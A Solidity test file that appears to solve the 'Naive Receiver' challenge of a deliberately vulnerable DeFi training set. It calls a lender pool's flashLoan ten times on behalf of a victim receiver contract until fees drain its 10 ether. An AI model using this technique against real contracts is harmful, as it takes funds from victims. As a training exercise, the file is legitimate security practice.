// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "../naive-receiver/FlashLoanReceiver.sol";
import "../naive-receiver/NaiveReceiverLenderPool.sol";

interface Vm {
    function deal(address who, uint256 amount) external;
    function expectRevert(bytes calldata) external;
}

contract NaiveReceiverTest is DSTest {
    NaiveReceiverLenderPool naiveReceiverLenderPool;
    FlashLoanReceiver flashLoanReceiver;

    Vm vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        naiveReceiverLenderPool = new NaiveReceiverLenderPool();
        flashLoanReceiver = new FlashLoanReceiver(payable(address(naiveReceiverLenderPool)));
        
        vm.deal(payable(address(naiveReceiverLenderPool)), 1000 ether);
        vm.deal(payable(address(flashLoanReceiver)), 10 ether);
    }

    function testNaiveReceiver() public {
        for (uint8 i = 9; i > 0; i--) {
            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), i * (1 ether));
        }
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
        emit log_int(int256(address(flashLoanReceiver).balance));
        require(address(flashLoanReceiver).balance == 0, "Receiver balance should be 0.");
        require(address(naiveReceiverLenderPool).balance == 1010 ether, "Pool balance should be 1010.");
    }
}
